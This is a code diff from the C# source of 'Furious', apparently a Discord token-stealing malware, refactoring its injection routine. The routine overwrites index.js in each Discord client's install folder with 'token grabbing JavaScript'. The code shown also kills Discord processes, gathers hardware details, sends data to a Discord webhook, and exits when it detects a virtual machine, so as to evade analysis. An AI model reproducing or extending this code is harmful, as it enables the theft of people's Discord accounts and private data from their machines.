@@ -27,66 +27,37 @@ namespace Furious
 				await SendData(await GetHardware());
 		}
 
-		///This method is used to write the token grabbing JavaScript code into the Discord directory.
-		public static async Task InjectJS()
+
+		internal static async Task Write(string path, string javascriptPath)
         {
-			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
+			if (Directory.Exists(path))
 			{
-				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
+				string[] discord = Directory.GetDirectories(path);
 				foreach (string folderName in discord)
 				{
 					if (folderName.Contains("0."))
 					{
-						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
-						await FileManagement.CleanFile(FileManagement.DiscordPath);
-						await FileManagement.WriteDiscord(FileManagement.DiscordPath, "Resources.stable.txt");
-					}
-				}
-			}
-			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb"))
-			{
-				string[] ptb = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb");
-				foreach (string folderName in ptb)
-				{
-					if (folderName.Contains("0."))
-					{
-						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
-						await FileManagement.CleanFile(FileManagement.PTBPath);
-						await FileManagement.WriteDiscord(FileManagement.PTBPath, "Resources.ptb.txt");
-					}
-				}
-			}
-			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary"))
-			{
-				string[] canary = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary");
-				foreach (string folderName in canary)
-				{
-					if (folderName.Contains("0."))
-					{
-						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
-						await FileManagement.CleanFile(FileManagement.CanaryPath);
-                        await FileManagement.WriteDiscord(FileManagement.CanaryPath, "Resources.canary.txt");
-					}
-				}
-			}
-			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment"))
-			{
-				string[] dev = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment");
-				foreach (string folderName in dev)
-				{
-					if (folderName.Contains("0."))
-					{
-						Console.WriteLine(folderName);
-						FileManagement.DevelopmentPath = folderName + @"\modules\discord_modules\index.js";
-						await FileManagement.CleanFile(FileManagement.DevelopmentPath);
-						await FileManagement.WriteDiscord(FileManagement.DevelopmentPath, "Resources.development.txt");
+						string DiscordPath = folderName + @"\modules\discord_modules\index.js";
+						await FileManagement.CleanFile(DiscordPath);
+						await FileManagement.WriteDiscord(DiscordPath, javascriptPath);
 					}
 				}
 			}
 		}
+		///This method is used to write the token grabbing JavaScript code into the Discord directory.
+		internal static async Task InjectJS()
+        {
+			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord", "Resources.stable.txt");
+
+			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb", "Resources.ptb.txt");
+
+			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary", "Resources.canary.txt");
+
+			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment", "Resources.development.txt");
+		}
 
 		///Closes all processes which contain "discord" in their name before writing the JS.
-		private static async Task CloseProcesses()
+		internal static async Task CloseProcesses()
 		{
 			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
 
@@ -94,7 +65,7 @@ namespace Furious
         }
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
-		public static async Task<string> GetHardware()
+		internal static async Task<string> GetHardware()
 		{
 			StringBuilder sb = new StringBuilder();
 
@@ -119,7 +90,7 @@ namespace Furious
 		}
 
 		///This method sends the data the paramater holds to a specified Discord webhook.
-		public static async Task<HttpResponseMessage> SendData(string data)
+		internal static async Task<HttpResponseMessage> SendData(string data)
 		{
 			string hook = "webhook-here";
 			
@@ -147,7 +118,7 @@ namespace Furious
 			return response;
 		}
 
-		public static Task<bool> UsingVM()
+		internal static Task<bool> UsingVM()
 		{
 			///If the process is running within a Virtual Machine, the process will close before executing code.
 			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
